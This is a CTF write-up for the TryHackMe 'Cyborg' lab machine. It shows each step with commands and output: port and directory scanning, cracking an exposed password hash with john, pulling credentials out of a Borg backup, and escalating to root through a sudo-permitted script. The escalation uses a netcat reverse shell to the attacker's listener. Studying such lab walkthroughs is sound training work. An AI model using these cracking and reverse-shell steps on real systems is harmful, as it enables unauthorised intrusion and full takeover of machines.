---
title: "Cyborg"
date: 2025-01-23
image: /assets/img/tryhackme/Cyborg/Cyborg_image.jpg
description: Writeup of the TryHackMe-CTF Cyborg
categories: [TryHackMe, Easy]
tags: [linux, enumeration, web, borg, privesc, code]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Cyborg</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>A box involving encrypted archives, source code analysis and more.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/cyborgt8">https://tryhackme.com/r/room/cyborgt8</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution to the CTF challenge Cyborg.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.48.122
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 05:46 EST
  Nmap scan report for 10.10.48.122
  Host is up (0.040s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  
  Nmap done: 1 IP address (1 host up) scanned in 30.27 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.48.122
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 05:48 EST
  Nmap scan report for 10.10.48.122
  Host is up (0.037s latency).
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
  |   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
  |_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
```
from here I started with port 80.

## Port 80 Analysis

I found a Apache default page with nothing intersting, so I started a `gobuster` scan:
```bash
$ gobuster dir --url http://10.10.48.122/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.48.122/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /admin                (Status: 301) [Size: 312] [--> http://10.10.48.122/admin/]
  /etc                  (Status: 301) [Size: 310] [--> http://10.10.48.122/etc/]
  /server-status        (Status: 403) [Size: 277]
  Progress: 163863 / 207644 (78.92%)
  ===============================================================
  Finished
  ===============================================================
```
analysis of the directories:

### /admin
The directory reveald an interesting website, where I found two things. First a chat about squid proxy and an archive which was downloadable:
```text
############################################
############################################
[Yesterday at 4.32pm from Josh]
Are we all going to watch the football game at the weekend??
############################################
############################################
[Yesterday at 4.33pm from Adam]
Yeah Yeah mate absolutely hope they win!
############################################
############################################
[Yesterday at 4.35pm from Josh]
See you there then mate!
############################################
############################################
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
############################################
############################################
```

### /etc
Directory browsing was activated which revealed two files. The first one called `passwd` reveald some username hash combination:
```text
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
and the second one a configuration file for a squid proxy:
```text
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```
## Archive Analysis
The archive seems to be quite intersting, so I extracted it:
```bash
$ tar -xvf archive.tar
  home/field/dev/final_archive/
  home/field/dev/final_archive/hints.5
  home/field/dev/final_archive/integrity.5
  home/field/dev/final_archive/config
  home/field/dev/final_archive/README
  home/field/dev/final_archive/nonce
  home/field/dev/final_archive/index.5
  home/field/dev/final_archive/data/
  home/field/dev/final_archive/data/0/
  home/field/dev/final_archive/data/0/5
  home/field/dev/final_archive/data/0/3
  home/field/dev/final_archive/data/0/4
  home/field/dev/final_archive/data/0/1
```
I serached aroung and found a hint:
```bash
$ cat README
  This is a Borg Backup repository.
  See https://borgbackup.readthedocs.io/
```
Quick check of the Borg Backup repo gave me all I need:
```bash
$ sudo apt install borgbackup
$ borg list home/field/dev/final_archive/
  Enter passphrase for key /home/kali/ctf/cyborg/home/field/dev/final_archive:
```
We need a password to interact with the archive, so I moved back to the hash user combination:
```bash
$ echo "music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn." > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash -force
  Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
  Use the "--format=md5crypt-long" option to force loading these as that type instead
  Using default input encoding: UTF-8
  Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
  Will run 8 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  [removed]        (music_archive)
  1g 0:00:00:00 DONE (2025-01-23 06:07) 11.11g/s 443733p/s 443733c/s 443733C/s jeremy21..pirilampo
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.
```
With the cracked password I was able to interact with the archive:
```bash
$ borg list home/field/dev/final_archive/
    Enter passphrase for key /home/kali/ctf/cyborg/home/field/dev/final_archive:
    music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```
I tried to decrypt the archive:
```bash
$ borg extract home/field/dev/final_archive::music_archive
  Enter passphrase for key /home/kali/ctf/cyborg/home/field/dev/final_archive:
```
and a new folder named `alex` appeared
```bash
$ ls -al
  total 64
  drwxr-xr-x 12 kali kali 4096 Dec 29  2020 .
  drwxrwxr-x  4 kali kali 4096 Jan 23 06:09 ..
  -rw-------  1 kali kali  439 Dec 28  2020 .bash_history
  -rw-r--r--  1 kali kali  220 Dec 28  2020 .bash_logout
  -rw-r--r--  1 kali kali 3637 Dec 28  2020 .bashrc
  drwx------  4 kali kali 4096 Dec 28  2020 .config
  drwx------  3 kali kali 4096 Dec 28  2020 .dbus
  drwxrwxr-x  2 kali kali 4096 Dec 29  2020 Desktop
  drwxrwxr-x  2 kali kali 4096 Dec 29  2020 Documents
  drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Downloads
  drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Music
  drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Pictures
  -rw-r--r--  1 kali kali  675 Dec 28  2020 .profile
  drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Public
  drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Templates
  drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Videos
```
I searched around and found something intersting:
```bash
$ cat secret.txt
  shoutout to all the people who have gotten to this stage whoop whoop!"
$ cat note.txt
  Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
  
  alex:[removed]
```
The credentials where valid to ssh into the machine and get the user flag:
```bash
$ ssh alex@10.10.48.122
  alex@ubuntu:~$ cat user.txt
  flag{*** removed ***}
```

## Privilege Escalation root
I started with `sudo -l` and got the following output which pointed to an intersting file:
```bash
alex@ubuntu:~$ sudo -l
  Matching Defaults entries for alex on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User alex may run the following commands on ubuntu:
      (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
The script `backup.sh` has two very intersting parts which can be missused:
```bash
$ cat backup.sh
[*** removed ***]
while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done
[*** removed ***]
cmd=$($command)
echo $cmd
```
The script checks for a parameter called `-c` and executes the given command in this part `cmd=$($command)`. I started a reverse listener and execute the script:
```bash
$ sudo ./backup.sh -c 'busybox nc 10.21.63.26 9001 -e sh'

-- on the attacker machine --

$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.21.63.26] from (UNKNOWN) [10.10.48.122] 48004
whoami
root
cat /root/root.txt
flag{*** removed ***}
```

solved! :)
